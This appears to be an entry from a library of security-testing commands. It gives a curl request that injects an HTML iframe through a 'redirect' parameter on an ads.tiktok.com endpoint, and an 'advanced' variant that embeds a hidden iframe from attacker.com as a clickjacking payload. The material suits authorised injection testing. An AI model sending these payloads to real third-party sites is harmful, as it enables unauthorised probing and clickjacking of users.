---
id: c3f4g5h6-i7j8-9013-fghi-6789012345
data: >-
  curl -X GET "https://ads.tiktok.com/some-endpoint?redirect=<iframe
  src=\"https://example.com\"></iframe>" -v
tags:
  - iframe
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-13T23:52:39.341Z'
verified: false
validated: true
submitted: true
---
# curl-iframe-payload

## Command

```bash
curl -X GET "https://ads.tiktok.com/some-endpoint?redirect=<iframe src=\"https://example.com\"></iframe>" -v
```

## Description

Injects an HTML iframe tag via the redirect parameter to test for embedding external content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `redirect=<iframe src=\"https://example.com\"></iframe>` | Iframe payload | Yes |
| `-v` | Verbose | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://ads.tiktok.com/some-endpoint?redirect=<iframe src=\"https://example.com\"></iframe>" -v
```

### Advanced Usage

```bash
curl -X GET "https://ads.tiktok.com/some-endpoint?redirect=<iframe src=\"https://attacker.com/clickjack\" style=\"opacity:0\"></iframe>" -v
```

## Expected Output

Response containing the iframe tag unescaped, allowing rendering in browser.

## Related

- [[Related Procedure]]
